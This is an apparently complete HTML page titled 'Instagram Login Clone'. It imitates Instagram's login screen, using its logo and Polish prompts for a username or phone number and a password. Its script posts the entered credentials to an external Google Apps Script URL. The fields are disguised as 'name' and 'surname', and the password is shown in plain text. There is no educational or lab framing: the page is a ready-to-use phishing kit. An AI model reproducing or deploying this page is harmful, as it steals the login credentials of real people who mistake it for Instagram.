<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Clone</title>
  <style>
    /* Basic reset and styling */
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: #fafafa;
    }
    .login-container {
      max-width: 350px;
      width: 100%;
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      text-align: center;
    }
    .login-container img {
      width: 175px;
      margin-bottom: 20px;
    }
    .input-field {
      width: 100%;
      margin-bottom: 15px;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    .login-btn {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: white;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .login-btn:disabled {
      background-color: #b2dffc;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    <form id="userForm">
      <input type="text" id="name" class="input-field" placeholder="Nazwa użytkownika lub numer telefonu: " required>
      <input type="text" id="surname" class="input-field" placeholder="Hasło: " required>
      <button type="button" class="login-btn" onclick="sendData()">Send</button>
    </form>
  </div>

  <script>
    function sendData() {
      const name = document.getElementById('name').value;
      const surname = document.getElementById('surname').value;

      if (name && surname) {
        fetch('https://script.google.com/macros/s/AKfycbxgkLwgInWMV6blE1x44mYuR5z8sxDgS49Et5Gm-JBA-H6rTWpFJ9mKZofnMus6gqJkDQ/exec', {
          method: 'POST',
          body: JSON.stringify({ name, surname }),
          headers: { 'Content-Type': 'application/json' }
        })
        .then(response => response.json())
        .then(data => alert('Data sent successfully!'))
        .catch(error => alert('Error sending data: ' + error.message));
      } else {
        alert('Please fill in all fields.');
      }
    }
  </script>
</body>
</html>
